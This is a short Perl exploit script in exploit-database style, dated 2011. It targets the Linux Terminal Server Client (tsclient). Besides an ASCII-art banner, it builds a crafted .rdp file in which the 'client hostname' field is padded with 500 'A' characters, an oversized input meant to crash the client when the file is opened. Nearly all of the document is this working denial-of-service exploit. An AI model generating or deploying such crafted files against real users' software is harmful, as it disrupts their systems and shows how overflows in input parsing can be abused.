#!/usr/bin/perl
# Exploit Title: [Terminal Server Client .rdp Dos ]
# Date: [2011-02-01]
# Author: [D3V!L FUCKER]
# Software Link: [sudo apt-get install tsclient] ^_^
# Version: [All Version]
# Tested on: [ubuntu 10.10]
##############################################################
#press to open then chois the T-T34M.rdp file then connect ^_^
#C0d3d By : SarBoT511 XD
print q(
   
4bdull4h@w.cn
               _
              | |
              | |===( )   //////
              |_|   |||  | o o|
                     ||| ( c  )                  ____
                      ||| \= /                  ||   \_
                       ||||||                   ||     |
                       ||||||                ...||__/|-"
                       ||||||             __|________|__
                         |||             |______________|
                         |||             || ||      || ||
                         |||             || ||      || ||
 ------------------------|||-------------||-||------||-||-------
                         |__>            || ||      || ||
 
 
      hit any key to continue
);
$headr1="alternate full switch:i:0
alternate shell:s:
attach to console:i:0
audiomode:i:0
auto connect:i:0
diskmapping:i:0
bitmapcachepersistenable:i:1\n";
$buffer="client hostname:s:"."A" x 500;
$headr2="compression:i:0
description:s:
desktop size id:i:1
desktopheight:i:0
desktopwidth:i:0
disable full window drag:i:0
disable menu anims:i:0
disable themes:i:0
disable wallpaper:i:0
displayconnectionbar:i:0
domain:s:
enable alternate shell:i:0
enable wm keys:i:0
full address:s:127.0.0.1
hide wm decorations:i:0
keyboard language:s:
keyboardhook:i:0
no motion events:i:0
password:b:
password 51:b:
progman group:s:
protocol:i:0
protocol file:s:
redirectcomports:i:0
redirectdrives:i:0
redirectprinters:i:0
redirectsmartcards:i:0
screen mode id:i:1
session bpp:i:0
shell working directory:s:
username:s:
winposstr:s:";
open (myfile,'>>T-T34M.rdp');
print myfile $headr1.$buffer.$headr2;
close(myfile);
